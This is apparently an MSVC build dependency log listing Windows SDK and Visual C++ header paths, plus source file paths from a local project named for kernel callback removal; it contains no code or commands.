C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK8.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISETCCONV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MINWINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\APIQUERY2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSENV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPIFROMAPP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DEBUGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UTILAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HANDLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ERRHANDLINGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FIBERSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMEDPIPEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROFILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HEAPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IOAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYNCHAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\INTERLOCKEDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTHREADSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSINFOAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MEMORYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ENCLAVEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLLEGACYAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WOW64APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LIBLOADERAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMESPACEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSTEMTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYAPPCONTAINER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REALTIMEAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINERROR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEZONEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINGDI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINUSER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\TVOUT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNLS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DATETIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\STRINGAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCONTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI3.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\VERRSRC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINREG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REASON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNETWK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WNNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\CDERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDEML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DLGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LZEXPAND.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSTEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSCOM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCIAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PLAYSOUNDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOYSTICKAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NB30.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCEP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNTERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCASYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SHELLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINPERF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSOCK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\INADDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSCARD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSIP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPESBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINIOCTL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINSMCRD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PRSHT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLE2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDLIB.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MALLOC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SEARCH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDLIB.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWNBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CGUID.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COML2API.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OAIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\URLMON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SERVPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MSXML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEAUTO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMMDLG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\STRALIGN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSVC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCX.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IMM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IME_CMODES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ACLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ACCCTRL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PSAPI.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDIO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\YVALS_CORE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XKEYCHECK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_STDIO_CONFIG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOSTREAM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\ISTREAM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\OSTREAM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XLOCNUM
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CFLOAT
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\FLOAT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CLIMITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CMATH
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\YVALS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CRTDBG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_NEW_DEBUG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_NEW.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CRTDEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\USE_ANSI.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDLIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\MATH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MATH.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTR1COMMON
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INTRIN0.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INTRIN0.INL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\ITERATOR
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOSFWD
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CWCHAR
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\WCHAR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCONIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WDIRECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SHARE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WPROCESS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WTIME.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SYS\STAT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SYS\TYPES.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XUTILITY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_ITER_CORE.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\UTILITY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INITIALIZER_LIST
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDDEF
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TYPE_TRAITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDINT
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDINT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STREAMBUF
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XIOSBASE
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SHARE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\SYSTEM_ERROR
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_SYSTEM_ERROR_ABI.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CERRNO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDEXCEPT
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCEPTION
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\MALLOC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_EXCEPTION.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_TERMINATE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XSTRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_SANITIZER_ANNOTATE_CONTAINER.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_STRING_VIEW.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XMEMORY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\NEW
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XATOMIC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XCALL_ONCE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XERRC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\ATOMIC
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTHREADS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_THREADS_CORE.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTIMEC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CTIME
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\TIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XLOCALE
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\MEMORY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TYPEINFO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_TYPEINFO.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XFACET
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XLOCINFO
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_XLOCINFO_TYPES.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CCTYPE
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CLOCALE
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\LOCALE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\TCHAR.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\MAP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TUPLE
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTREE
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TLHELP32.H
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.CPP
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINDOWS.H
